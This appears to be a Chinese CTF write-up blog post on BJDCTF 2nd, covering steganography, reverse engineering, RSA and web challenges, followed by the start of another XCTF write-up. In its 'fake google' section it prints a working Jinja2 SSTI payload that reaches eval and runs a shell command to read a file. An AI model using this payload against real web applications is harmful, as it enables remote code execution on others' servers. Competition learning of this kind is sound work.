src="/2020/03/23/CTF_BJDCTF2nd/ezbb_r.png" alt="题目"></p><p>刚开始以为是 LSB 之类的，看了各个图层都没明显的，但整体都是有明显的颗粒感……</p><p>后来以为是和上面那题的图有关系，对两张图做了加减等等操作，没有收获。</p><p>再看 hex 数据，这一堆还是感觉像二维码，这么规则的0和1。</p><p>最后，在我准备关掉 010editor 的时候，伸了个懒腰，从远处看，啊！</p><p>这也太有脑洞了吧！（自行脑补将<code>FF</code>或<code>ÿÿ</code>看成是实线就行）</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_RealEasyBaBa.png" alt="Misc_RealEasyBaBa"></p><p>于是得到flag。</p><p><code>BJD{572154976}</code></p><p><em>（这好像是 imagin 师傅的QQ号唉</em></p><h3 id="Imagin-开场曲"><a href="#Imagin-开场曲" class="headerlink" title="Imagin - 开场曲"></a>Imagin - 开场曲</h3><p>之前就看过这个 mikutap，前几天晚上还有个学弟 at 我来一起玩（探究）的……</p><p>就是这个→<a href="http://taqini.space/mikutap/" target="_blank" rel="noopener">http://taqini.space/mikutap/</a> ，多有意思呢。</p><p>他这个每一个按键对应着一个音调和一个动画，理论上可以逆向回去得到 flag。</p><p>拖进 PR 了反复听了好多遍，确定了几个字符，比如第一个字符应该是<code>M</code>……</p><p>原来是根据音调和动画来判断的，换了一个浏览器，发现动画不一样了，草（一种植物），不玩了惹。</p><p>思路感觉可以先录一段 BGM，做一个 sub 把视频中的 BGM 去除。而后给每一个按键录一个，确定映射关系，理论上就能唯一对应上原始按键。</p><p>（感觉直接听出来的真强，怕不是音游大佬？</p><h3 id="TARGZ-y1ng"><a href="#TARGZ-y1ng" class="headerlink" title="TARGZ-y1ng"></a>TARGZ-y1ng</h3><p>这道题之前一直没解出来，最后放了 hint 说解压密码是文件名。</p><p>于是手动解压了几个……每个都是上一个的密码。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_targz.png" alt="Misc_targz"></p><p>发现这样估计好久都解不完，于是写 jio 本！</p><p>搜了一下压缩包解压的 API，改了一下别人的代码，写了个循环。</p><p>考虑到最后的 flag 套娃很多不方便打开，于是就统一解压到一个相同的目录下好了。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> zipfile<span class="token keyword">def</span> <span class="token function">unzip_single</span><span class="token punctuation">(</span>src_file<span class="token punctuation">,</span> dest_dir<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''     解压单个文件到目标文件夹。    '''</span>    <span class="token keyword">if</span> password<span class="token punctuation">:</span>        password <span class="token operator">=</span> password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    zf <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>src_file<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        zf<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>path<span class="token operator">=</span>dest_dir<span class="token punctuation">,</span> pwd<span class="token operator">=</span>password<span class="token punctuation">)</span>    <span class="token keyword">except</span> RuntimeError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    zf<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    source_dir <span class="token operator">=</span> r<span class="token string">'./hW1ES89jF'</span>    dest_dir <span class="token operator">=</span> r<span class="token string">'./hW1ES89jF'</span>    password <span class="token operator">=</span> <span class="token string">'OKMIlLVft'</span>    i <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        entry_dir <span class="token operator">=</span> dest_dir <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">'.tar.gz'</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> password<span class="token punctuation">)</span>        dest_dir <span class="token operator">=</span> source_dir <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> password        unzip_single<span class="token punctuation">(</span>entry_dir<span class="token punctuation">,</span> dest_dir<span class="token punctuation">,</span> password<span class="token punctuation">)</span>        entry <span class="token operator">=</span> list<span class="token punctuation">(</span>os<span class="token punctuation">.</span>scandir<span class="token punctuation">(</span>dest_dir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> entry<span class="token punctuation">.</span>is_file<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span>entry<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'.gz'</span><span class="token punctuation">:</span>            password <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span>entry<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error!'</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span>        i <span class="token operator">+=</span> <span class="token number">1</span></code></pre><p>跑了一下发现最后在<code>8L0WifU3G</code>这个目录下，套娃了 299 还是 300个压缩包……</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_targz2.png" alt="Misc_targz2"></p><p>打开得到 flag：</p><p><code>BJD{wow_you_can_rea11y_dance}</code></p><h3 id="小姐姐-y1ng"><a href="#小姐姐-y1ng" class="headerlink" title="小姐姐-y1ng"></a>小姐姐-y1ng</h3><p>这题看了好久都没做出来……知道图片上有明显的错位，010editor 的脚本跑不下去。肯定是插入了东西。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_xiaojiejie.png" alt="小姐姐"></p><p>用了 strings 找，然而太懒没开 Ubuntu，没用上 grep，于是出了一堆字符串没发现 BJD……</p><p>怪我懒了（连 PentestBox 都懒得开，Ctrl + F 都懒得用</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_xiaojiejie_flag.png" alt="flag"></p><p><code>BJD{haokanma_xjj}</code></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h3><p>猜大小的游戏唉。玩个毛线，没有flag！</p><p>丢 IDA 里，看字符串就得到 flag。</p><p><code>BJD{S1mple_ReV3r5e_W1th_0D_0r_IDA}</code></p><p>果然是个随机数逗你玩呢。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Re_guessgame.png" alt="guessgame"></p><h3 id="8086"><a href="#8086" class="headerlink" title="8086"></a>8086</h3><p><img src="/2020/03/23/CTF_BJDCTF2nd/Re_8086.png" alt="8086"></p><p>看亚子只是把数据移到 DS 里，然后就死循环了。</p><p>之前学的微机原理 汇编忘得差不多了……（想起来这学期 DSP 后面编程还要用到 emmm</p><p>在 seg dseg 里有这一坨</p><p><code>]U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;</code></p><p>想了半天不知道是什么。。base91 解码不行。</p><p><del>难道是大小端问题？</del> 不是。</p><p>后面打开了ASCII表，既然 flag 格式是 <code>BJD{.+}</code>，前四位肯定对应着<code>BJD{</code>。这里对应着列出来。</p><table><thead><tr><th>Bin （二进制）</th><th>Oct （八进制）</th><th>Dec （十进制）</th><th>Hex （十六进制）</th><th>缩写/字符</th></tr></thead><tbody><tr><td>0111 1101</td><td>0175</td><td>125</td><td>0x7D</td><td>}</td></tr><tr><td>0100 0010</td><td>0102</td><td>66</td><td>0x42</td><td>B</td></tr><tr><td>0101 0101</td><td>0125</td><td>85</td><td>0x55</td><td>U</td></tr><tr><td>0100 1010</td><td>0112</td><td>74</td><td>0x4A</td><td>J</td></tr><tr><td>0110 0100</td><td>0144</td><td>100</td><td>0x64</td><td>d</td></tr><tr><td>0111 1011</td><td>0173</td><td>123</td><td>0x7B</td><td>{</td></tr></tbody></table><p>突然就发现了规律！</p><p>二进制后四位明显是取了反，前四位中的最低位也取了个反。</p><p>py一下，写了个jio本。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span>s <span class="token operator">=</span> <span class="token string">']U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;'</span>output <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x0f</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> chr<span class="token punctuation">(</span>temp <span class="token operator">^</span> <span class="token number">0x10</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 或者直接 ^ 0x1f</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    output <span class="token operator">+=</span> temp<span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># BJD{jack_de_hu1b1an_xuede_henHa0}$</span></code></pre><p>于是得到 flag 了！</p><p><code>BJD{jack_de_hu1b1an_xuede_henHa0}</code></p><p>嘤 要好好学汇编呢（</p><blockquote><p>看了 WP 发现原来是解密的代码被 IDA 当成是数据了（就是<code>assume ss:dseg, ds:nothing</code> 上面的那一部分）。</p><p>奇怪了我拿 emu8086 模拟器也没看到这一段，还跑死循环了。噢，<strong>本来就没跑到解密那部分代码！</strong></p><p>偷一下出题师傅的源代码，来自<a href="https://renjikai.com/bjdctf-2-dreamerjack/" target="_blank" rel="noopener">这里</a>。</p><pre class=" language-assembly"><code class="language-assembly">DATAS SEGMENT    str1 DB 5dH,55H,5bH,64H,75H,7eH,7cH,74H    DB 40H,7bH,7aH,40H,77H,6aH,2eH,7dH,2eH    DB 7eH,71H,40H,67H,6aH,7aH,7bH,7aH,40H    DB 77H,7aH,71H,57H,7eH,2fH,62H,59DATAS ENDSSTACKS SEGMENTSTACKS ENDSCODES SEGMENT    ASSUME CS:CODES,DS:DATAS,SS:STACKSloc:    jmp loc    mov CX,34    lea BX,str1lop:    mov DI,CX    dec DI    xor BYTE PTR [BX][DI],31    loop lop    lea DX,str1    mov AH,09H    int 21H    retSTART:    MOV AX,DATAS    MOV DS,AX    call loc    MOV AH,4CH    INT 21HCODES ENDS    END START</code></pre><p>解密的部分在<code>lop</code>里，果然是和 31（0x1F）做 xor。</p></blockquote><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到-y1ng"><a href="#签到-y1ng" class="headerlink" title="签到-y1ng"></a>签到-y1ng</h3><p><code>QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ==</code></p><p>base64 就行了。</p><p><code>BJD{W3lc0me_T0_BJDCTF}</code></p><h3 id="燕言燕语-y1ng"><a href="#燕言燕语-y1ng" class="headerlink" title="燕言燕语-y1ng"></a>燕言燕语-y1ng</h3><p><code>79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20</code></p><p>hex to ASCII：</p><p><code>yanzi ZJQ{xilzv_iqssuhoc_suzjg}</code> </p><p>这个试了各种密码，真没想到是 vigenere 密码，还在想 yanzi 是干啥用的……</p><p>（下次先考虑带有密钥的</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Crypto_yanzi.png" alt="yanzi"></p><p><code>BJD{yanzi_jiushige_shabi}</code></p><blockquote><p><a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/weijiniyamima.php</a></p></blockquote><h3 id="Y1nglish-y1ng"><a href="#Y1nglish-y1ng" class="headerlink" title="Y1nglish-y1ng"></a>Y1nglish-y1ng</h3><pre><code>Nkbaslk ds sef aslckdqdqst. Sef aslckdqdqst qo lzqtbw usf ufkoplkt zth oscpslsfko. Dpkfk zfk uqjk dwcko su dscqao qt dpqo aslckdqdqst, kzap su npqap qo jkfw mzoqa. Qu wse zfk qtdkfkodkh qt tkdnsfw okaefqdw, nkbaslk ds czfdqaqczdk. Bkd lk dkbb wse z odsfw.Q nzo pzjqtv hqttkf zd z fkodzefztd npkt Pzffw Odkkbk azlk qt, pk qo z Izcztkok ufsl Izczt med tsn pk qo tsd bqjqtv qt Izczt, lzwmk Pzffw qot'd z Izcztkok tzlk med pk qo fkzbbw z Izcztkok. Pzffw nsfwkh qt z bznwkf'o suuqak wkzfo zvs, med pk qo tsn nsfwqtv zd z mztw. Pk vkdo z vssh ozbzfw, med pk zbnzwo msffsno lstkw ufsl pqo ufqktho zth tkjkf czwo qd mzaw. Pzffw ozn lk zth azlk zthozdzd dpk ozlk dzmbk. Pk pzo tkjkf msffsnkh lstkw ufsl lk. Npqbk pk nzo kzdqtv, Q zowkh pql ds bkth lk &amp;2. Ds lw oefcfqok, pk vzjk lk dpk lstkw qllkhqzdkbw. 'Q pzjk tkjkf msfffsnkh ztw lstkw ufsl wse,' Pzffw ozqh,'os tsn wse azt czw usf lw hqttkf!' Tsn q nqbb vqjk wse npzd wse nztd.MIH{cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw}</code></pre><p>整了半天不知道咋办，最后想起来还有个词频大法！</p><p>搜了一下，<a href="https://quipqiup.com/" target="_blank" rel="noopener">这个网站</a> 可以分析词频。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Crypto_Yinglish.png" alt="quipquip"></p><p>很明显<code>MIH</code>对应着<code>BJD</code>。下面最像的就是这个了。</p><pre><code>Welcome to our competition. Our competition is mainly for freshmen and sophomores. There are five types of topics in this competition, each of which is very basic. If you are interested in networy security, welcome to participate. Let me tell you a story. I was having dinner at a restaurant when Harry Steele came in, he is a Japanese from Japan but now he is not living in Japan, maybe Harry isn't a Japanese name but he is really a Japanese. Harry woryed in a lawyer's office years ago, but he is now worying at a bany. He gets a good salary, but he always borrows money from his friends and never pays it bacy. Harry saw me and came andsatat the same table. He has never borrowed money from me. While he was eating, I asyed him to lend me &amp;2. To my surprise, he gave me the money immediately. 'I have never borrrowed any money from you,' Harry said,'so now you can pay for my dinner!' Now i will give you what you want. BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy}</code></pre><p>然而交上去不对。。</p><p>看了 hint 说</p><blockquote><p>改成Cr4zy是错误的</p></blockquote><p>突然想到是<code>crack</code>！于是得到 flag。（真就 quipquip 这个网站啊</p><p><code>BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}</code></p><h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><p>这是一张有着一堆喵喵的 gif。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/cat.gif" alt="cat"></p><p>8*10，想到是8位的 ASCII，10个字符。</p><p>01000010 果然是 <code>B</code></p><p>01111011 果然是 <code>{</code>，之后是</p><pre><code>01001101 00100001 01100001 00110000 01111110 01111101</code></pre><p>于是得到flag：<code>BJD{M!a0~}</code></p><p>真的是喵喵呀！</p><h3 id="灵能精通-y1ng"><a href="#灵能精通-y1ng" class="headerlink" title="灵能精通-y1ng"></a>灵能精通-y1ng</h3><blockquote><p>身经百战的Y1ng已经达到崇高的武术境界，以自律克己来取代狂热者的战斗狂怒与传统的战斗形式。Y1ng所受的训练也进一步将他们的灵能强化到足以瓦解周遭的物质世界。借由集中这股力量，Y1ng能释放灵能能量风暴来摧毁敌人的心智、肉体与器械。</p></blockquote><p><img src="/2020/03/23/CTF_BJDCTF2nd/jpg.png" alt=""></p><p>之前只知道猪圈密码，找了半天才发现了这个编码。</p><p>圣堂武士密码 (Templar Cipher) 是共济会的“猪圈密码”的一个变种，一直被共济会圣殿骑士用。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Templar_cipher.png" alt="Templar Cipher"></p><p>得到 <code>IMKNIGHTSTEMPLAR</code></p><p>最终 flag 为 <code>flag{IMKNIGHTSTEMPLAR}</code>。</p><h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h3><pre><code>罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝</code></pre><p>这题还以为是佛曰，结果发现不是……</p><p>看到别人提示发现真的蠢，下次先拿去给翻译读一遍就知道 flag 了。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Crypto_old_illiterate.png" alt="Crypto_old_illiterate"></p><p>啊不对- - </p><p>flag 是 <code>BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}</code>。</p><h3 id="圣火昭昭-y1ng"><a href="#圣火昭昭-y1ng" class="headerlink" title="圣火昭昭-y1ng"></a>圣火昭昭-y1ng</h3><p>这个是佛曰了，不过是新佛曰。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Crypto_Shenghuozhaozhao.png" alt="Crypto_Shenghuozhaozhao"></p><pre><code>新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如</code></pre><p>找了半天没找到解密网站。。来，收藏夹请。</p><blockquote><p>新佛曰：<a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">http://hi.pcmoe.net/buddha.html</a></p><p>佛曰（与佛论禅）：<a href="http://keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">http://keyfc.net/bbs/tools/tudoucode.aspx</a></p></blockquote><p>得到 <code>gemlovecom</code></p><blockquote><p>开局一张图，flag全靠<strong>猜</strong> </p><p>因为出题人失误搞错了，解出来的key去掉后3位的com</p></blockquote><p>去掉<code>com</code>套上 <code>BJD</code> 交上去发现不是。</p><p>想到可能这还是个 key/密钥。试了 F5 发现不是。</p><p>后来看别人的 WP 才知道是 outguess 图像隐写。（回去补一补</p><blockquote><p>来了来了。</p><p>GitHub 仓库：<a href="https://github.com/crorvick/outguess" target="_blank" rel="noopener">https://github.com/crorvick/outguess</a></p><blockquote><p>OutGuess is a universal steganographic tool that allows the insertion<br>of hidden information into the redundant bits of data sources.  The<br>nature of the data source is irrelevant to the core of OutGuess.  The<br>program relies on data specific handlers that will extract redundant<br>bits and write them back after modification.  In this version the PNM<br>and JPEG image formats are supported.  In the next paragraphs, images<br>will be used as concrete example of data objects, though OutGuess can<br>use any kind of data, as long as a handler is provided.</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/crorvick/outguess.git<span class="token function">cd</span> outguess./configure <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span></code></pre><p>（可能需要 sudo</p><p>常用的指令就加密和解密了。</p><pre class=" language-bash"><code class="language-bash">outguess -k <span class="token string">"my secret key"</span> -d hidden.txt demo.jpg out.jpg  <span class="token comment" spellcheck="true"># 加密</span>outguess -k <span class="token string">"my secret key"</span> -r out.jpg hidden.txt  <span class="token comment" spellcheck="true"># 解密</span></code></pre></blockquote><pre class=" language-bash"><code class="language-bash">outguess -k <span class="token string">"gemlove"</span> -r sheng_huo_zhao_zhao.jpg hidden.txt</code></pre><p>得到 flag：</p><p> <code>BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</code></p><h3 id="rsa0"><a href="#rsa0" class="headerlink" title="rsa0"></a>rsa0</h3><p>噫？？？<strong>啥时候出的 RSA？没发现……</strong></p><p>来补一下吧。nc 连上，<del>性感xx</del>在线发题。（题目每个环境好像不同）</p><pre><code>e=8490247p+q=21369803408498318739708021526026723998776452182678577483200290221438162215918869820587899450236798144391224673258554041165789338090777089646275960540717728p-q=306146015710299885882907488963590997669550770952584505436005104300551321544811637977008351542375001985864015345039058904779091905194377534370393296886314c=96533573625923830275446881118319408503602914319563862122714988417081897004192103015036939165809559375266874500604915724088338754724344545059907114669824228931409760092764538519264244823654706558401180531000987759255359721495957457449739266870026844498908937249390027970957614362784724540009268878226262563888flag=??????</code></pre><p>分别求得</p><pre><code>p = 10837974712104309312795464507495157498223001476815580994318147662869356768731840729282453900889586573188544344301796550035284214997985733590323176918802021q = 10531828696394009426912557018531566500553450705862996488882142558568805447187029091305445549347211571202680328956757491130505123092791356055952783621915707N = 114143693083732767570968317133346423549060454090175301453735671171095767847167710539383793168600011860725545060200762757793552681268747848968704851107766270420356743799632674648383021525392085925089984102330388262453473594582267963382904432339836113984790742410134450191464532864589123878301032917283483243847d = 50742668784054743796077308928583295672870545303739312689100966737709824813210506078737292591220582907244279005756665043057883285178390377660818970279568204675194935893051526661876109033037071837499249580434595390423343646371583506816678001938953327743693429532902954037961714874373553064053942402868925112743</code></pre><p>而后利用 <code>m = pow(c, d, p*q)</code> 求得</p><pre><code>m=14337636555111949737591403676611178785005554188521046827164791353101910846974617354025302694785689419018</code></pre><p>转 Hex 再转 ASCII，得到 flag</p><p><code>flag{656092c1-50bb-459c-89ec-4cabc69b4f3e}</code></p><blockquote><p>也可以用 <code>long_to_bytes</code>（需要安装密码库 <code>pip install pycryptodome</code>）</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> number<span class="token keyword">print</span><span class="token punctuation">(</span>number<span class="token punctuation">.</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>想起来之前说要装 GitHub 上那个 python 的 <a href="https://github.com/3summer/CTF-RSA-tool" target="_blank" rel="noopener">CTF-RSA-tool</a> 还没装……</p></blockquote><h3 id="rsa1"><a href="#rsa1" class="headerlink" title="rsa1"></a>rsa1</h3><p>nc 连上，得到题目。</p><pre><code>e=12907381p^2+q^2=102932491463627835236007836419728692812257769950144692124303780069034558043288683315680953131433063800883414074678408539431834987237784935126939862697346288221662934067206187303336972862679183761578127642359897410735067557329508997996877528676457832325049393014306728671643082858956472153689328530485292574802p-q=-185309818765397657063788122823542341789780127021615886794410874236918862158685471447960359346072372178791917183606614428484134793166273614667932437583552c=30690312081989972161704287726249224946940662102974666523203576217410481202381028355251332967180090326230702940141819337845402788001804202167909768819975074688832043578916709160998681086084701179452449493798807368207904007880376512732622389948601375493793025349147924632369047347529229462962308486909978038157flag=??????</code></pre><p>再来一次</p><pre><code>e=10288339p^2+q^2=102932491463627835236007836419728692812257769950144692124303780069034558043288683315680953131433063800883414074678408539431834987237784935126939862697346288221662934067206187303336972862679183761578127642359897410735067557329508997996877528676457832325049393014306728671643082858956472153689328530485292574802p-q=-185309818765397657063788122823542341789780127021615886794410874236918862158685471447960359346072372178791917183606614428484134793166273614667932437583552c=40022015279445190961446033046832809408451288751696588671880831212771863683480569497860194263202064993145631813232350651196681717050659541769219283733622429570927906815646087878932340172422964403729228165631808591658687044189905364508055754933678525530280551473343005313236082014906927913996378291225656288550flag=??????</code></pre><p>p 和 q 不变，则 </p><p>$$<br>n = p*q = \frac{p^2 + q^2 - (p-q)^2}{2}<br>$$</p><p>不变，考虑是<strong>共模攻击</strong>，后面来填坑。<em>（等我装上 RSA tools</em></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>这次没怎么看 Web 题……（（</p><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p>看到返回的页面上有个注释</p><p><code>&lt;!--ssssssti &amp; a little trick --&gt;</code></p><p>试了一下<code>{{1-1}}</code>可以得到 0，于是就是 SSTI 了。好像都不需要绕过。</p><p>payload：</p><pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}  {% for b in c.__init__.__globals__.values() %}  {% if b.__class__ == {}.__class__ %}    {% if 'eval' in b.keys() %}      {{ b['eval']('__import__("os").popen("cd /;cat flag").read()') }}    {% endif %}  {% endif %}  {% endfor %}{% endif %}{% endfor %}</code></pre><pre><code>http://f7ddf918-4b30-4225-b5c9-761bae6f5fdd.node3.buuoj.cn/qaq?name={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}%20%20{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}%20%20{%%20if%20b.__class__%20==%20{}.__class__%20%}%20%20%20%20{%%20if%20%27eval%27%20in%20b.keys()%20%}%20%20%20%20%20%20{{%20b[%27eval%27](%27__import__(%22os%22).popen(%22cd%20/;cat%20flag%22).read()%27)%20}}%20%20%20%20{%%20endif%20%}%20%20{%%20endif%20%}%20%20{%%20endfor%20%}{%%20endif%20%}{%%20endfor%20%}</code></pre><p><code>flag{8c252513-5c42-47fd-95b5-4d13a986e6d0}</code></p><p>（貌似是动态 flag</p><h3 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h3><p>​    <img src="/2020/03/23/CTF_BJDCTF2nd/Web_elementmaster.jpg" alt="Web_elementmaster"></p><p>手绘的唉（重点不对</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Web_elementmaster2.jpg" alt="source"></p><p>这里的<code>id</code>转 ASCII 得到 <code>Po.php</code>。</p><p>访问发现内容是一个 <code>.</code>，懵了。</p><p>给了 hint 说<code>mendeleev=门捷列夫</code>，还有 <code>from requests import *</code> 。</p><p>最后放了元素周期表……这脑洞真没想到。。</p><p>就是用元素周期表的元素去跑<code>xx.php</code>啦。<em>（难怪扫描器没用</em></p><h2 id="收个尾"><a href="#收个尾" class="headerlink" title="收个尾"></a>收个尾</h2><p>感觉这次 Crypto 和 Misc 题目本来就不怎么难，然而做起来感觉比较佛系，直接盲目上手，思路不大对，还懒。</p><p>有挺多套路没接触过的，脑洞还要大一点呢，后面有空再理一下做题的思路吧。</p><p>噢，官方 WP 也出来了，<a href="https://github.com/BjdsecCA/BJDCTF2020_March" target="_blank" rel="noopener">戳这里</a>吧。</p><p>嘤，还有一堆作业没补。</p><p>溜了溜了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | XCTF高校战“疫”网络安全分享赛 WriteUp</title>
      <link href="/2020/03/15/CTF_2020XCTF_gxzy/"/>
      <url>/2020/03/15/CTF_2020XCTF_gxzy/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/03/15/CTF_2020XCTF_gxzy/poster.jpg" alt="poster"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上上周看到了这个 XCTF 的高校战“疫”网络安全分享赛，觉得有点意思可以玩一下。</p><p>于是上周末就水了一下，然而啥也不会菜到爆炸，都没几道题会做……<em>（后面还<del>补作业</del>瞎折腾去了</em></p><p>最近看了看大佬们的 WP，估计在他们眼里都是签到题吧，啥也不说直接丢一个 payload 搞定走人（awsl。</p><p>不过还是有点感受或者其他方面的收获之类的，顺便来学点东西，随便写一点吧。</p><p><strong>官方 WP：</strong> <a href="./gxzy-WP.pdf">点这里下载</a>   <em>（版权归官方所有）</em></p><blockquote><p>好像好多环境都关了。</p><p>（话说这篇文章丢 draft 里好久了唉，再不发就要长草了。</p></blockquote><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="2019-nCoV"><a href="#2019-nCoV" class="headerlink" title="2019-nCoV"></a>2019-nCoV</h3><p>真·签到</p><p><code>flag{shijiejiayou}</code></p><p>武汉加油！中国加油！世界加油！</p><br><h3 id="简单MISC"><a href="#简单MISC" class="headerlink" title="简单MISC"></a>简单MISC</h3><p>压缩包里有一个<code>flag.zip</code>（加密） 和一个<code>photo.jpg</code>（打不开）。 </p><p><code>photo.jpg</code> 经过提取得到一个zip文件。</p><p>里面有一个 <code>ctf.txt</code> 文件，里面是</p><pre><code>./.--./../-.././--/../-.-./.../../-/..-/.-/-/../---/-./---/..-./..-/-./../...-/./.-./.../../-/-.--/.--/.-/.-.</code></pre><p>一看是摩斯密码，解密得到</p><p><code>EPIDEMICSITUATIONOFUNIVERSITYWAR</code></p><p>（嗯 EPIDEMIC  SITUATION  OF  UNIVERSITY  WAR 嘛。高校战疫啦。</p><p>作为密码，解压<code>flag.zip</code>文件，得到<code>flag.txt</code></p><p><code>VGgxc19pc19GbGFHX3lvdV9hUkVfcmlnSFQ=</code></p><p>base64解密得到flag：</p><p><code>Th1s_is_FlaG_you_aRE_rigHT</code></p><br><h3 id="隐藏的信息"><a href="#隐藏的信息" class="headerlink" title="隐藏的信息"></a>隐藏的信息</h3><p>压缩包里有个<code>二维码.jpg</code>，以及 <code>纯数字.zip</code>。</p><p>其中压缩包加密了。</p><p><img 